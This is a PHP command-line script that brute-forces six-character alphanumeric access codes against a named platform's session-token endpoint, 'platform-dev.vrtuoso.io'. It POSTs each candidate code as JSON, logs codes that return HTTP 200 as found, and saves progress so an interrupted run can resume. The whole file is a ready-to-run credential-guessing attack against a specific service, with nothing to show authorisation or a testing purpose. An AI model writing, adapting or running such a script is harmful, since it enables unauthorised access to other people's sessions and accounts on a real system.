#!/usr/local/bin/php
<?php

function postCurl($url, $data, &$info){
  $ch=curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  //curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
  curl_setopt($ch, CURLOPT_POST, true);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
  curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
  curl_setopt($ch, CURLOPT_TIMEOUT, 30);
  curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
  $o=curl_exec($ch);
  $info = curl_getinfo($ch);
  curl_close($ch);
  return $o;
}

$values = "0123456789abcdefghijklmnopqrstuvwxyz";
$length = 6;
$valCount = strlen($values);
$URI = "https://platform-dev.vrtuoso.io/v1/sessions/get_token";

$amount = pow($valCount, $length);
echo "There are $amount possible combinations.\n";

echo "Saving stuff in folder: ".getcwd();

$good = fopen("good.lst", 'w');
$weird = fopen("weird.lst", "a");

echo "Starting to check URLs\n";

$startFrom = 0;
if(isset($argv[1])) $startFrom = intval($argv[1]);
elseif(file_exists("last")) $startFrom = trim(file_get_contents("last"));

$max = $amount;
if(isset($argv[2])) $max = intval($argv[2]);

echo "Starting from $startFrom going up to $max\n";
$startFrom = intval($startFrom);
$max = intval($max);
for($k=$startFrom; $k<$max; ++$k){
  file_put_contents("./last", $k);
  $code = base_convert($k, 10, $valCount);
  if( strlen($code) < $length ) $code = str_pad ( $code, $length, '0', STR_PAD_LEFT );
  $perc = number_format( $k/$amount, 3 );
  // echo "Testing $code - $k/$amount - $perc %\r";
  if( preg_match('/00|11|22|33|44|55|66|77|88|99|aa|bb|cc|dd|ee|ff|gg|hh|ii|jj|kk|ll|mm|nn|oo|pp|qq|rr|ss|tt|uu|vv|ww|xx|yy|zz/', $code)==1) continue;
  $ret = json_decode( postCurl( $URI, '{"access_data":"'.$code.'"}', $info) );
  if( !isset($ret->status_code) ){
    echo "Resource returned status: ".$info['http_code']."                            \n";
    if($info['http_code']==200){
      echo "FOUND CODE: ".$code."                           \n";
      fwrite($good, $code."\n");
    }else{
      fwrite($weird, $code."\n");
    }
  }
}
echo "\n";
fclose($good);
fclose($weird);
